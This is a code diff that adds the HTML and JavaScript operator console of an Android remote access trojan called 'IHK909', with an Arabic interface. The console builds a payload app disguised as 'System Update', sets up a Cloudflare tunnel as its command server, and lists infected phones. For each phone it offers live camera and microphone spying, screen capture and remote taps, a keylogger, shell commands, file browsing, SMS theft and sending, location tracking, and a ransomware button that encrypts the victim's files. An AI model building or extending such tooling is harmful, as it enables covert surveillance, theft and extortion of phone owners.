@@ -1,0 +1,388 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+<title>IHK909 // 2050</title>
+<style>
+:root{--bg:#08090d;--p:#0f1118;--p2:#161922;--ink:#e8ecf5;--m:#6b7280;--l:#1f2430;
+  --neon:#00f0ff;--ember:#ff5a1f;--hot:#ff2e63;--ok:#33d17a;--warn:#f2c94c}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{margin:0;background:var(--bg);color:var(--ink);
+  font:13px/1.5 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;overflow-x:hidden}
+body::before{content:'';position:fixed;inset:0;pointer-events:none;z-index:9999;
+  background:repeating-linear-gradient(0deg,rgba(0,240,255,0.03) 0 1px,transparent 1px 3px);
+  mix-blend-mode:overlay;opacity:.6}
+.top{display:flex;justify-content:space-between;align-items:center;padding:12px 16px;
+  border-bottom:1px solid var(--l);background:linear-gradient(180deg,#0b0d14,#08090d);
+  position:sticky;top:0;z-index:20}
+.brand{font-weight:900;letter-spacing:2px;font-size:14px}
+.brand .h{color:var(--neon);text-shadow:0 0 10px var(--neon)}
+.brand .v{color:var(--ember);margin-left:6px;font-size:11px;letter-spacing:4px}
+#conn{font-size:11px;color:var(--m);display:flex;align-items:center;gap:6px}
+#conn::before{content:'';width:7px;height:7px;border-radius:50%;background:var(--m);
+  box-shadow:0 0 8px currentColor}
+#conn.on::before{background:var(--ok);color:var(--ok)}
+.tabs{display:flex;gap:4px;padding:10px 12px;overflow-x:auto;
+  border-bottom:1px solid var(--l);scrollbar-width:none;background:#0a0c12}
+.tabs::-webkit-scrollbar{display:none}
+.tab{background:transparent;border:1px solid var(--l);color:var(--m);
+  padding:8px 14px;border-radius:6px;white-space:nowrap;font:inherit;font-size:12px;
+  cursor:pointer;letter-spacing:1px;transition:.15s}
+.tab.active{color:var(--neon);border-color:var(--neon);
+  box-shadow:0 0 12px rgba(0,240,255,.35) inset}
+.view{padding:14px;animation:fade .25s ease}
+@keyframes fade{from{opacity:0;transform:translateY(4px)}to{opacity:1}}
+.card{background:var(--p);border:1px solid var(--l);border-radius:10px;
+  padding:14px;margin-bottom:12px;position:relative;overflow:hidden}
+.card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;
+  background:linear-gradient(90deg,transparent,var(--neon),transparent);opacity:.4}
+.card h3{margin:0 0 12px;font-size:11px;color:var(--neon);
+  text-transform:uppercase;letter-spacing:3px;font-weight:700}
+input,textarea,button,select{font:inherit;width:100%;background:var(--p2);
+  border:1px solid var(--l);color:var(--ink);padding:10px;border-radius:6px;
+  outline:none;margin-bottom:8px;font-size:13px}
+input:focus,textarea:focus{border-color:var(--neon);
+  box-shadow:0 0 0 2px rgba(0,240,255,.15)}
+button{cursor:pointer;font-weight:700;
+  background:linear-gradient(135deg,#0d7a8a,#00f0ff);border:none;color:#00121a;
+  padding:11px;margin-bottom:6px;letter-spacing:1px;transition:.15s;
+  text-transform:uppercase;font-size:12px}
+button:hover{filter:brightness(1.15);box-shadow:0 0 16px rgba(0,240,255,.4)}
+button.ghost{background:var(--p2);color:var(--ink);border:1px solid var(--l)}
+button.ghost:hover{border-color:var(--neon);color:var(--neon);box-shadow:none}
+button.danger{background:linear-gradient(135deg,#8a0d2e,#ff2e63);color:#fff}
+.dev{background:var(--p2);border:1px solid var(--l);border-radius:10px;
+  padding:12px;margin-bottom:8px;cursor:pointer;transition:.15s;position:relative}
+.dev:hover{border-color:var(--neon)}
+.dev.active{border-color:var(--neon);background:#0e1a22}
+.dev.active::after{content:'';position:absolute;right:0;top:10px;bottom:10px;
+  width:3px;background:var(--neon);box-shadow:0 0 12px var(--neon)}
+.dev .id{font-weight:700;color:var(--neon);font-size:13px;
+  word-break:break-all;display:flex;align-items:center;gap:8px}
+.dev .meta{color:var(--m);font-size:11px;margin-top:4px}
+.dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:var(--m)}
+.dot.on{background:var(--ok);color:var(--ok);animation:pulse 2s infinite;
+  box-shadow:0 0 6px var(--ok)}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
+pre{background:#05060a;padding:10px;border-radius:6px;overflow:auto;font-size:11px;
+  max-height:280px;white-space:pre-wrap;word-break:break-all;
+  border:1px solid var(--l);color:#9fb3c8}
+.row{display:flex;gap:8px;margin-bottom:8px}.row>*{flex:1;min-width:0}
+.tag{font-size:11px;color:var(--m);margin-bottom:8px}
+.preview{max-width:100%;border-radius:8px;margin-top:8px;border:1px solid var(--l)}
+.stream{background:#000;width:100%;border-radius:8px;min-height:180px;
+  border:1px solid var(--neon);box-shadow:0 0 20px rgba(0,240,255,.15)}
+.badge{display:inline-block;background:var(--p2);border:1px solid var(--l);
+  padding:2px 8px;border-radius:99px;font-size:10px;letter-spacing:1px;color:var(--m)}
+.badge.live{color:var(--hot);border-color:var(--hot);
+  box-shadow:0 0 8px rgba(255,46,99,.4)}
+.badge.live::before{content:'●';margin-left:4px;animation:pulse 1s infinite}
+</style>
+</head>
+<body>
+<div class="top">
+  <div class="brand"><span class="h">IHK909</span><span class="v">2050</span></div>
+  <div id="conn">offline</div>
+</div>
+<div class="tabs">
+  <button class="tab active" data-v="sessions">الجلسات</button>
+  <button class="tab" data-v="tunnel">النفق</button>
+  <button class="tab" data-v="build">بناء</button>
+  <button class="tab" data-v="device">التحكم</button>
+</div>
+<div id="view" class="view"></div>
+
+<script>
+const $=s=>document.querySelector(s);
+const state={tab:'sessions',token:null,ws:null,connected:false,pending:{}};
+const esc=s=>String(s==null?'':s).replace(/[<>&]/g,c=>({'<':'&lt;','>':'&gt;','&':'&amp;'}[c]));
+const jget=u=>fetch(u).then(r=>r.json());
+const jpost=(u,b)=>fetch(u,{method:'POST',headers:{'Content-Type':'application/json'},
+  body:JSON.stringify(b||{})}).then(r=>r.json());
+
+document.querySelector('.tabs').onclick=e=>{
+  const b=e.target.closest('.tab');if(!b)return;
+  document.querySelectorAll('.tab').forEach(x=>x.classList.toggle('active',x===b));
+  state.tab=b.dataset.v;render();
+};
+
+function connectWS(){
+  const proto=location.protocol==='https:'?'wss':'ws';
+  const ws=new WebSocket(`${proto}://${location.host}/operator`);
+  state.ws=ws;
+  ws.onopen=()=>{state.connected=true;$('#conn').textContent='online';
+    $('#conn').classList.add('on')};
+  ws.onclose=()=>{state.connected=false;$('#conn').textContent='offline';
+    $('#conn').classList.remove('on');setTimeout(connectWS,3000)};
+  ws.onmessage=ev=>{
+    let m;try{m=JSON.parse(ev.data)}catch(e){return}
+    if(m.type==='session'&&state.tab==='sessions')render();
+    else if(m.type==='cmd_result'){
+      const cb=state.pending[m.req_id];
+      if(cb){delete state.pending[m.req_id];cb(m)}
+    }
+    else if(m.type==='event')handleEvent(m);
+  };
+}
+
+function handleEvent(m){
+  if(m.event==='cam_frame'){
+    const el=$('#camStream');if(!el)return;
+    el.src='data:image/jpeg;base64,'+m.data.jpeg_b64;
+    const b=$('#camBadge');if(b)b.className='badge live';
+  } else if(m.event==='audio_chunk'){
+    feedAudio(m.data);
+    const b=$('#audBadge');if(b)b.className='badge live';
+  } else if(m.event==='keylog'){
+    const el=$('#keylogOut');
+    if(el)el.textContent += `[${m.data.pkg}] ${m.data.text}\n`;
+  }
+}
+
+function wsCmd(cmd,args,timeout=90000){
+  return new Promise((res,rej)=>{
+    if(!state.connected||!state.token)return rej('offline');
+    const id=Math.random().toString(36).slice(2,10);
+    state.pending[id]=res;
+    state.ws.send(JSON.stringify({type:'cmd',id,token:state.token,cmd,args}));
+    setTimeout(()=>{if(state.pending[id]){delete state.pending[id];rej('timeout')}},timeout);
+  });
+}
+
+let audioCtx=null,audioQueue=[],audioPlaying=false;
+function feedAudio(d){
+  if(!d.pcm_b64)return;
+  try{
+    const bin=atob(d.pcm_b64);
+    const bytes=new Uint8Array(bin.length);
+    for(let i=0;i<bin.length;i++)bytes[i]=bin.charCodeAt(i);
+    const i16=new Int16Array(bytes.buffer);
+    const f32=new Float32Array(i16.length);
+    for(let i=0;i<i16.length;i++)f32[i]=i16[i]/32768;
+    audioQueue.push(f32);
+    if(!audioPlaying)playNext(d.rate||16000);
+  }catch(e){}
+}
+function playNext(rate){
+  if(!audioCtx)audioCtx=new (window.AudioContext||window.webkitAudioContext)();
+  if(audioQueue.length===0){audioPlaying=false;return}
+  audioPlaying=true;
+  const chunk=audioQueue.shift();
+  const buf=audioCtx.createBuffer(1,chunk.length,rate);
+  buf.copyToChannel(chunk,0);
+  const src=audioCtx.createBufferSource();
+  src.buffer=buf;src.connect(audioCtx.destination);
+  src.onended=()=>playNext(rate);src.start();
+}
+
+async function render(){
+  if(state.tab==='sessions')return renderSessions();
+  if(state.tab==='tunnel')return renderTunnel();
+  if(state.tab==='build')return renderBuild();
+  if(state.tab==='device')return renderDevice();
+}
+
+async function renderSessions(){
+  const v=$('#view');
+  v.innerHTML='<div class="tag">loading...</div>';
+  try{
+    const arr=await jget('/api/sessions');
+    if(!arr.length){v.innerHTML='<div class="card"><h3>NO SESSIONS</h3>'+
+      '<div class="tag">ابنِ بايلود وأرسله. سيظهر الجهاز هنا تلقائياً.</div></div>';return;}
+    v.innerHTML=arr.map(d=>`
+      <div class="dev ${state.token===d.token?'active':''}" onclick="sel('${d.token}')">
+        <div class="id"><span class="dot ${d.online?'on':''}"></span>${esc(d.brand)} ${esc(d.model)}</div>
+        <div class="meta">${esc(d.release)} · SDK ${d.sdk} · ${d.online?'ONLINE':'OFFLINE'}</div>
+        <div class="meta">${esc(d.token)}</div>
+      </div>`).join('');
+    if(!state.token||!arr.find(x=>x.token===state.token))state.token=arr[0].token;
+  }catch(e){v.innerHTML=`<pre>${esc(e)}</pre>`}
+}
+
+function sel(t){state.token=t;state.tab='device';
+  document.querySelectorAll('.tab').forEach(x=>x.classList.toggle('active',x.dataset.v==='device'));
+  render()}
+
+async function renderTunnel(){
+  const v=$('#view');const cfg=await jget('/api/tunnel/status');
+  v.innerHTML=`
+    <div class="card">
+      <h3>CLOUDFLARE QUICK TUNNEL</h3>
+      <div class="tag">لا يحتاج توكن أو حساب. اضغط الزر فقط — سيظهر الرابط خلال ~10 ثوانٍ.</div>
+      <button onclick="startTunnel()">▶ تشغيل النفق</button>
+      <pre id="tunnel-out">${cfg.active?'✔ متصل: '+esc(cfg.url):'غير متصل'}</pre>
+    </div>`;
+}
+
+async function startTunnel(){
+  const out=$('#tunnel-out');
+  out.textContent='جاري التشغيل...';
+  try{
+    const r=await jpost('/api/tunnel/start',{});
+    if(r.error){out.textContent='ERR: '+r.error;return}
+    if(r.status==='starting'||!r.url){
+      out.textContent='جاري إنشاء النفق...';
+      const poll=setInterval(async()=>{
+        const s=await jget('/api/tunnel/status');
+        if(s.active){out.textContent='✔ متصل: '+s.url;clearInterval(poll)}
+      },2000);
+    } else if(r.url){
+      out.textContent='✔ متصل: '+r.url;
+    }
+  }catch(e){out.textContent='ERR: '+e}
+}
+
+async function renderBuild(){
+  const v=$('#view');
+  const cfg=await jget('/api/tunnel/status');
+  v.innerHTML=`
+    <div class="card">
+      <h3>BUILD PAYLOAD</h3>
+      <div class="tag">C2: ${cfg.active?esc(cfg.url):'<span style="color:#ff2e63">النفق غير مفعل — شغّله أولاً</span>'}</div>
+      <input id="b-name" placeholder="App label" value="System Update"/>
+      <input id="b-pkg" placeholder="package id" value="com.ihk909.payload"/>
+      <button onclick="doBuild()">▶ BUILD</button>
+      <pre id="b-out">ready</pre>
+    </div>`;
+}
+
+async function doBuild(){
+  const out=$('#b-out');out.textContent='building...';
+  try{
+    const r=await jpost('/api/build',
+      {app_name:$('#b-name').value,package_id:$('#b-pkg').value});
+    if(r.error){out.textContent='ERR '+r.error;return}
+    out.innerHTML=`✔ built\nToken: ${r.token}\nC2: ${r.c2}\n\n
+      <button onclick="IHK.installApk('${r.path}')">INSTALL</button>
+      <button class="ghost" onclick="IHK.shareApk('${r.path}')">SHARE</button>`;
+  }catch(e){out.textContent='ERR '+e}
+}
+
+async function renderDevice(){
+  const v=$('#view');
+  if(!state.token){v.innerHTML='<div class="card"><h3>SELECT DEVICE</h3></div>';return}
+  v.innerHTML=`
+  <div class="card">
+    <h3>QUICK CONTROL</h3>
+    <div class="row"><input id="toastMsg" placeholder="Toast message"/>
+      <button onclick="runCmd('ui.toast',{msg:$('#toastMsg').value})">TOAST</button></div>
+    <div class="row"><input id="notifT" placeholder="title"/><input id="notifM" placeholder="body"/>
+      <button onclick="runCmd('ui.notification',{title:$('#notifT').value,msg:$('#notifM').value})">NOTIF</button></div>
+    <div class="row"><input id="dialogT" placeholder="title"/><input id="dialogM" placeholder="body"/>
+      <button onclick="runCmd('ui.dialog',{title:$('#dialogT').value,msg:$('#dialogM').value})">DIALOG</button></div>
+    <div class="row">
+      <button onclick="runCmd('ui.vibrate',{ms:2000})">VIBRATE</button>
+      <button onclick="runCmd('ui.wake.lock',{on:true})">WAKE</button>
+      <button class="ghost" onclick="runCmd('ui.wake.lock',{on:false})">SLEEP</button>
+    </div>
+    <div class="row"><input type="file" id="wpFile" accept="image/*"/>
+      <button onclick="sendWallpaper()">WALLPAPER</button></div>
+  </div>
+
+  <div class="card">
+    <h3>CAMERA <span class="badge" id="camBadge">idle</span></h3>
+    <div class="row">
+      <select id="camId"><option value="0">BACK</option><option value="1">FRONT</option></select>
+      <button onclick="runCmd('camera.snap',{camera:$('#camId').value}).then(r=>showCam(r))">SNAP</button>
+    </div>
+    <div class="row">
+      <button onclick="runCmd('camera.stream.start',{camera:$('#camId').value})">▶ LIVE</button>
+      <button class="ghost" onclick="runCmd('camera.stream.stop',{});$('#camBadge').className='badge'">■ STOP</button>
+    </div>
+    <img id="camStream" class="stream" alt=""/>
+    <div id="camSnapOut"></div>
+  </div>
+
+  <div class="card">
+    <h3>AUDIO <span class="badge" id="audBadge">idle</span></h3>
+    <div class="row"><input id="audMs" value="5000"/>
+      <button onclick="runCmd('audio.record',{ms:parseInt($('#audMs').value)}).then(r=>showAud(r))">RECORD</button></div>
+    <div class="row">
+      <button onclick="runCmd('audio.live.start',{})">▶ LIVE</button>
+      <button class="ghost" onclick="runCmd('audio.live.stop',{});$('#audBadge').className='badge'">■ STOP</button>
+    </div>
+    <div id="audOut"></div>
+  </div>
+
+  <div class="card">
+    <h3>SCREEN</h3>
+    <div class="row"><button onclick="runCmd('screen.snap',{}).then(r=>showScreen(r))">SNAPSHOT</button></div>
+    <div class="row"><input id="tapX" placeholder="x" type="number"/>
+      <input id="tapY" placeholder="y" type="number"/>
+      <button onclick="runCmd('screen.gesture',{type:'tap',x:+$('#tapX').value,y:+$('#tapY').value})">TAP</button></div>
+    <div class="row"><input id="txtIn" placeholder="text to type"/>
+      <button onclick="runCmd('screen.text',{text:$('#txtIn').value})">TYPE</button></div>
+    <img id="screenStream" class="stream" alt=""/>
+  </div>
+
+  <div class="card">
+    <h3 style="color:#ff2e63">RANSOMWARE</h3>
+    <div class="row"><input id="rPwd" placeholder="password"/></div>
+    <div class="row"><input id="rMsg" placeholder="lock message" value="ملفاتك مشفرة"/></div>
+    <button class="danger" onclick="if(confirm('CONFIRM RANSOM?'))runCmd('ransom.start',{password:$('#rPwd').value,msg:$('#rMsg').value})">🔒 ENCRYPT</button>
+    <button class="ghost" onclick="runCmd('ransom.unlock',{password:$('#rPwd').value})">🔓 DECRYPT</button>
+  </div>
+
+  <div class="card">
+    <h3>KEYLOGGER</h3>
+    <div class="row">
+      <button onclick="runCmd('keylog.start',{})">▶ START</button>
+      <button class="ghost" onclick="runCmd('keylog.stop',{})">■ STOP</button>
+    </div>
+    <pre id="keylogOut"></pre>
+  </div>
+
+  <div class="card">
+    <h3>SHELL / FILES / SMS</h3>
+    <div class="row"><input id="shCmd" placeholder="whoami"/>
+      <button onclick="runCmd('shell.exec',{cmd:$('#shCmd').value}).then(r=>show($('#shOut'),r))">RUN</button></div>
+    <pre id="shOut"></pre>
+    <div class="row"><input id="fPath" value="/sdcard"/>
+      <button onclick="runCmd('files.list',{path:$('#fPath').value}).then(r=>show($('#fOut'),r))">LIST</button></div>
+    <pre id="fOut"></pre>
+    <div class="row"><input id="smsTo" placeholder="+123"/>
+      <input id="smsBody" placeholder="text"/>
+      <button onclick="runCmd('sms.send',{to:$('#smsTo').value,body:$('#smsBody').value})">SMS</button></div>
+    <button onclick="runCmd('sms.list',{limit:100}).then(r=>show($('#fOut'),r))">READ SMS</button>
+    <button onclick="runCmd('location.get',{}).then(r=>show($('#fOut'),r))">LOCATION</button>
+    <button onclick="runCmd('info',{}).then(r=>show($('#fOut'),r))">INFO</button>
+  </div>`;
+}
+
+async function runCmd(cmd,args,timeout){
+  try{return await wsCmd(cmd,args||{},timeout)}
+  catch(e){return {ok:false,error:String(e)}}
+}
+function show(el,r){if(el)el.textContent=JSON.stringify(r,null,2)}
+function showCam(r){
+  if(!r.ok){$('#camSnapOut').textContent=r.error;return}
+  const img=document.createElement('img');img.className='preview';
+  img.src='data:image/jpeg;base64,'+r.data.jpeg_b64;
+  $('#camSnapOut').innerHTML='';$('#camSnapOut').appendChild(img);
+}
+function showAud(r){
+  if(!r.ok){$('#audOut').textContent=r.error;return}
+  const a=document.createElement('audio');a.controls=true;
+  a.src='data:audio/mp4;base64,'+r.data.m4a_b64;
+  $('#audOut').innerHTML='';$('#audOut').appendChild(a);
+}
+function showScreen(r){
+  if(!r.ok){$('#screenStream').alt=r.error;return}
+  $('#screenStream').src='data:image/jpeg;base64,'+r.data.jpeg_b64;
+}
+function sendWallpaper(){
+  const f=document.getElementById('wpFile').files[0];
+  if(!f){alert('select image');return}
+  const r=new FileReader();
+  r.onload=()=>{
+    const b64=r.result.split(',')[1];
+    runCmd('ui.wallpaper',{b64}).then(x=>alert(x.ok?'ok':'ERR '+x.error));
+  };
+  r.readAsDataURL(f);
+}
+
+connectWS();render();
+</script>
+</body>
+</html>
